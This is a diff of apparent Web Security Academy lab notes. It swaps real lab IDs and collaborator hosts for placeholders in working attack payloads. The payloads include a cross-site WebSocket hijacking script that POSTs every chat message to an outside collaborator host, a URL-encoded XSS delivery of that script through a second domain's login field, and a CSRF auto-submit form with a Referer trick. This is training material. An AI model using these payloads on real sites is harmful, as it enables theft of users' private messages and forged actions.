@@ -115,18 +115,18 @@
 
 Connect to websocket script
 <script>
-    var ws = new WebSocket('wss://0a2c0084041bceee80568092009400b1.web-security-academy.net/chat');
+    var ws = new WebSocket('wss://<your-lab-id>/chat');
     ws.onopen = function() {
         ws.send("READY");
     };
     ws.onmessage = function(event) {
-        fetch('https://<your-lab-id>POST', mode: 'no-cors', body: event.data});
+        fetch('https://<your-collaborator>', {method: 'POST', mode: 'no-cors', body: event.data});
     };
 </script>
 
     Used the second domain that was vulnerable to XSS to send in this script on exploit server
 <script>
-    document.location = "https://<your-second domain>/login?username=%3Cscript%3E+++++var+ws+%3D+new+WebSocket%28%27wss%3A%2F%2F0a2c0084041bceee80568092009400b1.web-security-academy.net%2Fchat%27%29%3B+++++ws.onopen+%3D+function%28%29+%7B+++++++++ws.send%28%22READY%22%29%3B+++++%7D%3B+++++ws.onmessage+%3D+function%28event%29+%7B+++++++++fetch%28%27https%3A%2F%2F1y0cmqhq8vmfeywv8k1f48jy7pdg16pv.oastify.com%27%2C+%7Bmethod%3A+%27POST%27%2C+mode%3A+%27no-cors%27%2C+body%3A+event.data%7D%29%3B+++++%7D%3B+%3C%2Fscript%3E&password=pas"
+    document.location = "https://<your-second domain>/login?username=%3Cscript%3E+++++var+ws+%3D+new+WebSocket%28%27wss%3A%2F%2F<your-lab-id%2Fchat%27%29%3B+++++ws.onopen+%3D+function%28%29+%7B+++++++++ws.send%28%22READY%22%29%3B+++++%7D%3B+++++ws.onmessage+%3D+function%28event%29+%7B+++++++++fetch%28%27https%3A%2F%2F1y<your-collaborator>%27%2C+%7Bmethod%3A+%27POST%27%2C+mode%3A+%27no-cors%27%2C+body%3A+event.data%7D%29%3B+++++%7D%3B+%3C%2Fscript%3E&password=pas"
 </script>
 
     CSRF bypass via cookie refresh
@@ -177,7 +177,7 @@ Connect to websocket script
       <input type="submit" value="Submit request" />
     </form>
     <script>
-      history.pushState('', '', '/csrf?0a900000041e7d0d81d4f7f700bf00fe.web-security-academy.net');
+      history.pushState('', '', '/csrf?<your-lab-id>');
       document.forms[0].submit();
     </script>
   </body>
